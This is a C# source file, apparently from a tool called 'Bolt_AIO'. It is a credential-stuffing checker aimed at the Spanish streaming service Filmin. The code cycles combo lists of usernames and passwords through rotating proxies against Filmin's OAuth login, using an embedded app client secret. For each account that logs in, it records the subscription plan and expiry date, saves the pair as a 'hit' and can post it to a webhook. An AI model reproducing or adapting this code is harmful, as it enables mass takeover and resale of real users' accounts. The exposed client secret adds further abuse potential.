using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;
using Newtonsoft.Json.Linq;

namespace Bolt_AIO
{
    internal class filminmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            var capture = new StringBuilder();

                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = false;
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            req.AddHeader("Accept", "application/vnd.filmin.v1+json");
                            req.AddHeader("Cache-Control", "no-cache");
                            req.AddHeader("Accept-Encoding", "UTF-8");
                            req.AddHeader("X-Client-Identifier", "Android_v3.9.8_build101");
                            req.AddHeader("X-Client-Id", "j2Gal1ZDbCtdiRa9");
                            req.AddHeader("X-Client-Language", "es-ES");
                            req.AddHeader("Connection", "close");
                            req.AddHeader("User-Agent", "okhttp/3.8.0");

                            var res0 = req.Post("https://apiv3.filmin.es/oauth/access_token",
                                "username=" + array[0] +
                                "&client_id=j2Gal1ZDbCtdiRa9&client_secret=zPNBDTu01qXQHlqkNqK8iY8p7H8nmW7x&password=" +
                                array[1] + "&grant_type=password", "application/x-www-form-urlencoded");
                            var text0 = res0.ToString();

                            switch (Convert.ToInt32(res0.StatusCode))
                            {
                                case 200:
                                {
                                    var AT = JSON(text0, "access_token").FirstOrDefault();
                                    req.AddHeader("Authorization", "Bearer " + AT + "");
                                    req.AddHeader("Accept", "application/vnd.filmin.v1+json");
                                    req.AddHeader("Cache-Control", "no-cache");
                                    req.AddHeader("Accept-Encoding", "UTF-8");
                                    req.AddHeader("X-Client-Identifier", "Android_v3.9.8_build101");
                                    req.AddHeader("X-Client-Id", "j2Gal1ZDbCtdiRa9");
                                    req.AddHeader("X-Client-Language", "es-ES");
                                    req.AddHeader("Connection", "close");
                                    req.AddHeader("User-Agent", "okhttp/3.8.0");

                                    var res1 = req.Get("https://apiv3.filmin.es/user/");
                                    var text1 = res1.ToString();

                                    if (text1.Contains("subscriptions\":{\"data\":[]}"))
                                    {
                                        Program.Frees++;
                                        Program.TotalChecks++;
                                        if (Program.lorc == "LOG")
                                            Settings.PrintFree("Flimin", array[0] + ":" + array[1]);
                                        Export.AsResult("/Flimin_frees", array[0] + ":" + array[1] + " | " + capture);
                                    }
                                    else
                                    {
                                        var Plan = JSON(text1, "name").FirstOrDefault();
                                        capture.Append(" | Plan = " + Plan);
                                        var ExpirationDate = JSON(text1, "expiration_date").FirstOrDefault();
                                        capture.Append(" | Expiration Date = " + ExpirationDate);
                                        Export.AsResult("/Flimin_hits", array[0] + ":" + array[1] + " | " + capture);
                                        Program.Hits++;
                                        Program.TotalChecks++;
                                        if (Program.lorc == "LOG")
                                            Settings.PrintHit("Flimin", array[0] + ":" + array[1]);
                                        if (Settings.sendToWebhook)
                                            Settings.sendTowebhook1(array[0] + ":" + array[1] + " | " + capture,
                                                "Flimin hits");
                                    }

                                    break;
                                }
                                case 401:
                                    break;
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        public static IEnumerable<string> JSON(string input, string field, bool recursive = false,
            bool useJToken = false)
        {
            var list = new List<string>();

            if (useJToken)
            {
                if (recursive)
                {
                    if (input.Trim().StartsWith("["))
                    {
                        var json = JArray.Parse(input);
                        var jsonlist = json.SelectTokens(field, false);
                        foreach (var j in jsonlist)
                            list.Add(j.ToString());
                    }
                    else
                    {
                        var json = JObject.Parse(input);
                        var jsonlist = json.SelectTokens(field, false);
                        foreach (var j in jsonlist)
                            list.Add(j.ToString());
                    }
                }
                else
                {
                    if (input.Trim().StartsWith("["))
                    {
                        var json = JArray.Parse(input);
                        list.Add(json.SelectToken(field, false).ToString());
                    }
                    else
                    {
                        var json = JObject.Parse(input);
                        list.Add(json.SelectToken(field, false).ToString());
                    }
                }
            }
            else
            {
                var jsonlist = new List<KeyValuePair<string, string>>();
                parseJSON("", input, jsonlist);
                foreach (var j in jsonlist)
                    if (j.Key == field)
                        list.Add(j.Value);

                if (!recursive && list.Count > 1) list = new List<string> {list.First()};
            }

            return list;
        }

        private static void parseJSON(string A, string B, List<KeyValuePair<string, string>> jsonlist)
        {
            jsonlist.Add(new KeyValuePair<string, string>(A, B));

            if (B.StartsWith("["))
            {
                JArray arr = null;
                try
                {
                    arr = JArray.Parse(B);
                }
                catch
                {
                    return;
                }

                foreach (var i in arr.Children())
                    parseJSON("", i.ToString(), jsonlist);
            }

            if (B.Contains("{"))
            {
                JObject obj = null;
                try
                {
                    obj = JObject.Parse(B);
                }
                catch
                {
                    return;
                }

                foreach (var o in obj)
                    parseJSON(o.Key, o.Value.ToString(), jsonlist);
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}